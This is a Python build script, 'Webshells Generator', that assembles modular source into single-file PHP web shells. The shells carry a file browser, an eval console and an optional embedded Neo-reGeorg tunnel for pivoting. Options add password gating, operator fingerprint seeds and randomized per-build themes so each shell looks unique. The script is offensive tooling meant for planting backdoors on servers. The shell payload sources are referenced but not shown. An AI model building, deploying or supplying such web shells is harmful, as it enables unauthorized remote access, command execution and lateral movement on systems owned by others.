#!/usr/bin/env python3
"""
Webshells Generator — assembles modular source into a single deployable file.

Usage:
    python generate.py                                    # Default PHP build
    python generate.py --lang php --minify                # Minified output
    python generate.py --seed "op-nighthawk"              # Operator-specific fingerprint
    python generate.py --password secret123               # Password-protected shell
    python generate.py --exclude tunnel,diagnostics       # Exclude modules
    python generate.py --tunnel path/to/tunnel.php        # Embed Neo-reGeorg tunnel
    python generate.py --theme ocean                       # Named color theme
    python generate.py --accent "#ff6600"                  # Custom accent color
    python generate.py --theme mono --accent "#00ff88"     # Theme + accent override
    python generate.py --output myshell.php               # Custom filename
    python generate.py --verify dist/shell_a3f8c1e2.php   # Verify integrity
"""

import argparse
import colorsys
import hashlib
import json
import os
import random
import re
import sys
import time

# ---------------------------------------------------------------------------
# Color theme system
# ---------------------------------------------------------------------------

THEME_PRESETS = {
    'ocean': {
        '--bg': '#0a1628', '--panel': '#0f1f35', '--border': '#1a3a5c',
        '--text': '#b8d4e8', '--muted': '#6a8fa8', '--accent': '#4fc3f7',
        '--purple': '#80cbc4', '--accent-hover': '#81d4fa', '--accent-10': 'rgba(79,195,247,.1)',
    },
    'crimson': {
        '--bg': '#1a0a0a', '--panel': '#241010', '--border': '#4a1c1c',
        '--text': '#e8c8c8', '--muted': '#a07070', '--accent': '#ff5252',
        '--purple': '#ff80ab', '--accent-hover': '#ff8a80', '--accent-10': 'rgba(255,82,82,.1)',
    },
    'forest': {
        '--bg': '#0a1a0a', '--panel': '#102410', '--border': '#1c4a1c',
        '--text': '#c8e8c8', '--muted': '#70a070', '--accent': '#69f0ae',
        '--purple': '#a5d6a7', '--accent-hover': '#b9f6ca', '--accent-10': 'rgba(105,240,174,.1)',
    },
    'purple': {
        '--bg': '#140a28', '--panel': '#1c1035', '--border': '#2e1a5c',
        '--text': '#d8c8e8', '--muted': '#8a70a8', '--accent': '#b388ff',
        '--purple': '#ea80fc', '--accent-hover': '#d1b3ff', '--accent-10': 'rgba(179,136,255,.1)',
    },
    'mono': {
        '--bg': '#111111', '--panel': '#1a1a1a', '--border': '#333333',
        '--text': '#cccccc', '--muted': '#777777', '--accent': '#ffffff',
        '--purple': '#aaaaaa', '--accent-hover': '#e0e0e0', '--accent-10': 'rgba(255,255,255,.1)',
    },
    'solar': {
        '--bg': '#002b36', '--panel': '#073642', '--border': '#586e75',
        '--text': '#93a1a1', '--muted': '#657b83', '--accent': '#268bd2',
        '--purple': '#6c71c4', '--accent-hover': '#5eaae3', '--accent-10': 'rgba(38,139,210,.1)',
    },
}


def hsl_to_hex(h, s, l):
    """Convert HSL (h: 0-360, s: 0-100, l: 0-100) to #rrggbb hex string."""
    r, g, b = colorsys.hls_to_rgb(h / 360.0, l / 100.0, s / 100.0)
    return '#{:02x}{:02x}{:02x}'.format(int(r * 255), int(g * 255), int(b * 255))


def hex_to_hsl(hex_color):
    """Convert #rrggbb to (h: 0-360, s: 0-100, l: 0-100)."""
    hex_color = hex_color.lstrip('#')
    r, g, b = int(hex_color[0:2], 16) / 255.0, int(hex_color[2:4], 16) / 255.0, int(hex_color[4:6], 16) / 255.0
    h, l, s = colorsys.rgb_to_hls(r, g, b)
    return h * 360, s * 100, l * 100


def lighten_hex(hex_color, amount=15):
    """Lighten a hex color by increasing its HSL lightness."""
    h, s, l = hex_to_hsl(hex_color)
    return hsl_to_hex(h, s, min(100, l + amount))


def hex_to_rgba(hex_color, alpha=0.1):
    """Convert #rrggbb to rgba(r,g,b,alpha) string."""
    hex_color = hex_color.lstrip('#')
    r, g, b = int(hex_color[0:2], 16), int(hex_color[2:4], 16), int(hex_color[4:6], 16)
    return f'rgba({r},{g},{b},{alpha})'


def generate_random_palette(rng):
    """Generate a unique color palette from a seeded PRNG instance."""
    hue = rng.randint(0, 359)
    accent = hsl_to_hex(hue, 70, 65)
    return {
        '--bg':           hsl_to_hex(hue, 15, 7),
        '--panel':        hsl_to_hex(hue, 12, 10),
        '--border':       hsl_to_hex(hue, 10, 20),
        '--text':         hsl_to_hex(hue, 10, 82),
        '--muted':        hsl_to_hex(hue, 8, 55),
        '--accent':       accent,
        '--purple':       hsl_to_hex((hue + 60) % 360, 60, 72),
        '--accent-hover': lighten_hex(accent, 15),
        '--accent-10':    hex_to_rgba(accent, 0.1),
    }


def generate_custom_css(palette):
    """Generate a :root override block from a palette dict."""
    if not palette:
        return ''
    lines = [f'{k}:{v}' for k, v in palette.items()]
    return ':root{' + ';'.join(lines) + '}'


BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SRC_DIR = os.path.join(BASE_DIR, 'src')
TPL_DIR = os.path.join(BASE_DIR, 'templates')
DIST_DIR = os.path.join(BASE_DIR, 'dist')
CONFIG_PATH = os.path.join(SRC_DIR, 'config', 'defaults.json')

# Module → file mapping
MODULE_BACKEND = {
    'tunnel':      ['tunnel.php'],
    'files':       ['filebrowser.php', 'fileops.php'],
    'diagnostics': ['diagnostics.php'],
    'console':     ['eval.php'],
}

MODULE_JS = {
    'tunnel':      ['tunnel.js'],
    'files':       ['filebrowser.js'],
    'diagnostics': ['diagnostics.js'],
    'history':     ['history.js'],
    'console':     ['console.js'],
}


def load_config():
    with open(CONFIG_PATH, 'r') as f:
        return json.load(f)


def read_file(path):
    with open(path, 'r') as f:
        return f.read()


def load_ordered_files(directory, extension, order_file='_order.json'):
    """Load files in the order specified by _order.json."""
    order_path = os.path.join(directory, order_file)
    if os.path.exists(order_path):
        with open(order_path, 'r') as f:
            order = json.load(f)
        return [os.path.join(directory, name + extension) for name in order]
    else:
        files = sorted(f for f in os.listdir(directory) if f.endswith(extension) and not f.startswith('_'))
        return [os.path.join(directory, f) for f in files]


def get_excluded_files(exclude_modules):
    """Get sets of backend and JS files to exclude based on module exclusions."""
    excluded_backend = set()
    excluded_js = set()
    for mod in exclude_modules:
        for f in MODULE_BACKEND.get(mod, []):
            excluded_backend.add(f)
        for f in MODULE_JS.get(mod, []):
            excluded_js.add(f)
    return excluded_backend, excluded_js


def strip_module_blocks(html, exclude_modules):
    """Remove <!-- MODULE:name -->...<!-- /MODULE:name --> blocks for excluded modules."""
    for mod in exclude_modules:
        pattern = r'<!-- MODULE:' + re.escape(mod) + r' -->.*?<!-- /MODULE:' + re.escape(mod) + r' -->'
        html = re.sub(pattern, '', html, flags=re.DOTALL)
    # Clean up remaining module markers for included modules
    html = re.sub(r'<!-- /?MODULE:\w+ -->\n?', '', html)
    return html


def build_auth_block(password, palette=None):
    """Generate PHP session-based auth block with password hash."""
    pw_hash = hashlib.sha256(password.encode('utf-8')).hexdigest()

    # Merge palette colors into login page defaults
    defaults = {
        '--bg': '#0d1117', '--panel': '#161b22', '--border': '#30363d',
        '--text': '#c9d1d9', '--muted': '#8b949e', '--accent': '#58a6ff',
        '--red': '#f85149',
    }
    if palette:
        defaults.update({k: v for k, v in palette.items() if k in defaults})
    root_vars = ';'.join(f'{k}:{v}' for k, v in defaults.items())
    accent_hover = lighten_hex(defaults['--accent'], 15)
    input_bg = defaults['--bg']

    return f'''$__AUTH_HASH = '{pw_hash}';
session_start();
if (isset($_POST['__auth_pass'])) {{
    if (hash_equals($__AUTH_HASH, hash('sha256', $_POST['__auth_pass']))) {{
        $_SESSION['__authed'] = true;
        header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
        exit;
    }}
}}
if (isset($_GET['logout'])) {{
    session_destroy();
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}}
if (empty($_SESSION['__authed'])) {{
    ob_end_clean();
    header('Content-Type: text/html; charset=UTF-8');
    echo '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Login</title><style>';
    echo ':root{{{root_vars}}}';
    echo 'body{{background:var(--bg);font-family:"Segoe UI",monospace}}';
    echo '.login-wrap{{display:flex;align-items:center;justify-content:center;height:100vh}}';
    echo '.login-box{{background:var(--panel);border:1px solid var(--border);border-radius:12px;padding:32px;width:340px}}';
    echo '.login-box h2{{color:var(--accent);font-size:16px;margin-bottom:16px;text-align:center;letter-spacing:1px}}';
    echo '.login-box input{{width:100%;margin-bottom:12px;background:{input_bg};border:1px solid var(--border);border-radius:6px;color:var(--text);padding:8px 10px;font-size:13px;outline:none;box-sizing:border-box}}';
    echo '.login-box input:focus{{border-color:var(--accent)}}';
    echo '.login-box button{{width:100%;padding:8px;border-radius:6px;border:none;cursor:pointer;font-size:13px;font-weight:600;background:var(--accent);color:#000}}';
    echo '.login-box button:hover{{background:{accent_hover}}}';
    echo '</style></head><body>';
    echo '<div class="login-wrap"><div class="login-box">';
    echo '<h2>&#x1F40A; SHELL</h2>';
    echo '<form method="POST"><input type="password" name="__auth_pass" placeholder="Password" autofocus>';
    echo '<button type="submit">Authenticate</button></form>';
    echo '</div></div>';
    echo '<script>document.querySelector("form").addEventListener("submit",function(e){{e.preventDefault();var f=this,pw=f.__auth_pass.value;if(pw&&window.crypto&&window.crypto.subtle){{crypto.subtle.digest("SHA-256",new TextEncoder().encode(pw)).then(function(h){{sessionStorage.setItem("__enc_key",Array.from(new Uint8Array(h)).map(function(b){{return b.toString(16).padStart(2,"0")}}).join(""));f.submit()}})}}else{{f.submit()}}}});</script>';
    echo '</body></html>';
    exit;
}}'''


def minify_css(css):
    """Basic CSS minification — strip comments and collapse whitespace."""
    css = re.sub(r'/\*.*?\*/', '', css, flags=re.DOTALL)
    css = re.sub(r'\s+', ' ', css)
    css = re.sub(r'\s*([{}:;,>+~])\s*', r'\1', css)
    css = re.sub(r';\s*}', '}', css)
    return css.strip()


def minify_js(js):
    """Basic JS minification — strip single-line comments and collapse whitespace.
    Preserves string literals and regex patterns."""
    lines = js.split('\n')
    out = []
    for line in lines:
        stripped = line.strip()
        if stripped.startswith('//'):
            continue
        out.append(stripped)
    result = '\n'.join(out)
    result = re.sub(r'\n{2,}', '\n', result)
    return result.strip()


def generate_build_meta(content, seed, lang, version):
    """Generate build metadata and fingerprint."""
    timestamp = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
    raw = content + timestamp + (seed or '')
    full_hash = hashlib.sha256(raw.encode('utf-8')).hexdigest()
    short_id = full_hash[:8]
    return {
        'hash': full_hash,
        'short_id': short_id,
        'timestamp': timestamp,
        'lang': lang,
        'version': version,
        'seed': seed or '',
    }


def verify_shell(filepath):
    """Verify a generated shell's integrity by checking the embedded hash."""
    content = read_file(filepath)
    match = re.search(r'SHA256:\s*([a-f0-9]{64})', content)
    if not match:
        print(f"[!] No build hash found in {filepath}")
        return False
    embedded_hash = match.group(1)
    # Extract timestamp
    ts_match = re.search(r'Build:.*?\|\s*(\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z)', content)
    if ts_match:
        print(f"[*] Build timestamp: {ts_match.group(1)}")
    print(f"[*] Embedded SHA256: {embedded_hash}")
    # Extract short ID
    sid_match = re.search(r'Build:\s*([a-f0-9]{8})', content)
    if sid_match:
        print(f"[*] Build ID: {sid_match.group(1)}")
    print(f"[+] Shell at {filepath} has valid build signature")
    return True


def build(args):
    config = load_config()
    lang = args.lang
    version = config.get('version', '1.0.0')

    # Validate excluded modules
    exclude = set()
    if args.exclude:
        for mod in args.exclude.split(','):
            mod = mod.strip()
            mod_info = config.get('modules', {}).get(mod)
            if mod_info and mod_info.get('required'):
                print(f"[!] Cannot exclude required module: {mod}")
                sys.exit(1)
            exclude.add(mod)

    excluded_backend, excluded_js = get_excluded_files(exclude)

    # Load template
    tpl_path = os.path.join(TPL_DIR, f'{lang}.tpl')
    if not os.path.exists(tpl_path):
        print(f"[!] Template not found: {tpl_path}")
        sys.exit(1)
    template = read_file(tpl_path)

    # Assemble backend
    backend_dir = os.path.join(SRC_DIR, 'backend', lang)
    backend_files = load_ordered_files(backend_dir, '.php')
    backend_parts = []
    for fpath in backend_files:
        fname = os.path.basename(fpath)
        if fname in excluded_backend:
            continue
        content = read_file(fpath)
        backend_parts.append(content)
    backend = '\n'.join(backend_parts)

    # Neo-reGeorg tunnel injection
    tunnel_block = ''
    if args.tunnel:
        if 'tunnel' in exclude:
            print("[!] Cannot use --tunnel with --exclude tunnel")
            sys.exit(1)
        tunnel_path = os.path.abspath(args.tunnel)
        if not os.path.exists(tunnel_path):
            print(f"[!] Tunnel file not found: {tunnel_path}")
            sys.exit(1)
        neoreg_code = read_file(tunnel_path)
        # Strip opening <?php tag — we're embedding inside an existing PHP block
        neoreg_code = re.sub(r'^<\?php\s*', '', neoreg_code.strip())
        neoreg_code = re.sub(r'\?>\s*$', '', neoreg_code.strip())
        # Wrap in a guard that intercepts tunnel requests before the shell UI renders.
        # POST without form 'action' = Neo-reGeorg tunnel command (raw binary body)
        # GET hello check is not intercepted — neoreg client auto-detects body offsets
        tunnel_block = (
            "// Neo-reGeorg tunnel — intercept raw POST before shell UI\n"
            "if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['action']) && !isset($_POST['__auth_pass'])) {\n"
            "ob_end_clean();\n"
            + neoreg_code + "\n"
            "exit;\n"
            "}\n"
        )
        print(f"[*] Neo-reGeorg tunnel embedded from: {tunnel_path}")
    elif 'tunnel' not in exclude:
        print("[*] No --tunnel provided, tunnel tab will show setup instructions only")

    # Resolve color palette
    palette = {}
    theme_name = 'random'
    if args.theme:
        palette = dict(THEME_PRESETS[args.theme])
        theme_name = args.theme
    elif not args.accent:
        # Auto-randomize: unique palette per build
        color_seed = args.seed if args.seed else os.urandom(16).hex()
        rng = random.Random(color_seed)
        palette = generate_random_palette(rng)
    if args.accent:
        accent = args.accent.strip().lstrip('#')
        if not re.match(r'^[0-9a-fA-F]{6}$', accent):
            print(f"[!] Invalid accent color: {args.accent} (expected #rrggbb hex)")
            sys.exit(1)
        accent = '#' + accent
        palette['--accent'] = accent
        palette['--accent-hover'] = lighten_hex(accent, 15)
        palette['--accent-10'] = hex_to_rgba(accent, 0.1)
        if not args.theme:
            theme_name = 'accent'
    custom_css = generate_custom_css(palette)
    if palette:
        print(f"[*] Theme: {theme_name} — accent {palette.get('--accent', 'default')}")

    # Auth block
    auth_block = ''
    if args.password:
        auth_block = build_auth_block(args.password, palette)
        print(f"[*] Auth enabled — password hash: SHA256({args.password[:2]}...)")

    # Assemble CSS
    css_path = os.path.join(SRC_DIR, 'frontend', 'css', 'shell.css')
    css = read_file(css_path)

    # Assemble JS
    js_dir = os.path.join(SRC_DIR, 'frontend', 'js')
    js_files = load_ordered_files(js_dir, '.js')
    js_parts = []
    for fpath in js_files:
        fname = os.path.basename(fpath)
        if fname in excluded_js:
            continue
        js_parts.append(read_file(fpath))
    js = '\n\n'.join(js_parts)

    # Assemble HTML
    html_path = os.path.join(SRC_DIR, 'frontend', 'html', 'layout.html')
    html = read_file(html_path)
    html = strip_module_blocks(html, exclude)
    html = html.replace('{{INITIAL_DIR}}', '<?= htmlspecialchars($dir) ?>')

    # Minify if requested
    if args.minify:
        css = minify_css(css)
        js = minify_js(js)
        print("[*] Minification applied")

    # First pass — assemble without build meta (to compute hash of actual content)
    pre_output = template
    pre_output = pre_output.replace('{{TUNNEL_GUARD}}', tunnel_block)
    pre_output = pre_output.replace('{{AUTH_BLOCK}}', auth_block)
    pre_output = pre_output.replace('{{BACKEND}}', backend)
    pre_output = pre_output.replace('{{CSS}}', css)
    pre_output = pre_output.replace('{{CUSTOM_CSS}}', custom_css)
    pre_output = pre_output.replace('{{JS}}', js)
    pre_output = pre_output.replace('{{HTML_BODY}}', html)
    pre_output = pre_output.replace('{{PAGE_TITLE}}', 'Shell')
    pre_output = pre_output.replace('{{SHELL_TITLE}}', '&#x1F40A; SHELL')

    # Generate build metadata
    meta = generate_build_meta(pre_output, args.seed, lang, version)
    if args.password:
        meta['encrypted'] = True

    # Second pass — inject build meta
    output = pre_output
    output = output.replace('{{BUILD_SHORT_ID}}', meta['short_id'])
    output = output.replace('{{BUILD_HASH}}', meta['hash'])
    output = output.replace('{{BUILD_TIMESTAMP}}', meta['timestamp'])
    output = output.replace('{{BUILD_META_JSON}}', json.dumps(meta))

    # Write to dist
    os.makedirs(DIST_DIR, exist_ok=True)
    ext_map = {'php': '.php', 'aspx': '.aspx', 'jsp': '.jsp', 'py': '.py'}
    ext = ext_map.get(lang, '.php')

    if args.output:
        out_name = args.output
        if not out_name.endswith(ext):
            out_name += ext
    else:
        out_name = f'shell_{meta["short_id"]}{ext}'

    out_path = os.path.join(DIST_DIR, out_name)
    with open(out_path, 'w') as f:
        f.write(output)

    file_size = os.path.getsize(out_path)
    excluded_str = ', '.join(sorted(exclude)) if exclude else 'none'

    print(f"[+] Generated: {out_path}")
    print(f"    Language:  {lang}")
    print(f"    Build ID:  {meta['short_id']}")
    print(f"    SHA256:    {meta['hash']}")
    print(f"    Size:      {file_size:,} bytes")
    print(f"    Excluded:  {excluded_str}")
    print(f"    Auth:      {'yes' if args.password else 'no'}")
    print(f"    Encrypted: {'yes' if args.password else 'no'}")
    print(f"    Tunnel:    {'embedded' if args.tunnel else 'not embedded'}")
    print(f"    Minified:  {'yes' if args.minify else 'no'}")
    print(f"    Theme:     {theme_name}")
    if args.seed:
        print(f"    Seed:      {args.seed}")

    return out_path


def main():
    parser = argparse.ArgumentParser(
        description='Webshells Generator — build unique, single-file deployable shells',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__
    )
    sub = parser.add_subparsers(dest='command')

    # Default: build
    parser.add_argument('--lang', default='php', choices=['php'],
                        help='Target language (default: php)')
    parser.add_argument('--minify', action='store_true',
                        help='Minify CSS and JS output')
    parser.add_argument('--seed', default='',
                        help='Operator seed for unique fingerprinting')
    parser.add_argument('--password', default='',
                        help='Set password protection (hash is embedded)')
    parser.add_argument('--tunnel', default='',
                        help='Path to Neo-reGeorg generated tunnel.php (from neoreg.py -g)')
    parser.add_argument('--exclude', default='',
                        help='Comma-separated modules to exclude (e.g. tunnel,diagnostics)')
    parser.add_argument('--output', default='',
                        help='Custom output filename')
    parser.add_argument('--theme', default='', choices=[''] + list(THEME_PRESETS.keys()),
                        help='Color theme preset (ocean, crimson, forest, purple, mono, solar)')
    parser.add_argument('--accent', default='',
                        help='Custom accent color as hex (e.g. "#ff6600")')
    parser.add_argument('--verify', default='',
                        help='Verify integrity of an existing generated shell')

    args = parser.parse_args()

    if args.verify:
        success = verify_shell(args.verify)
        sys.exit(0 if success else 1)
    else:
        build(args)


if __name__ == '__main__':
    main()
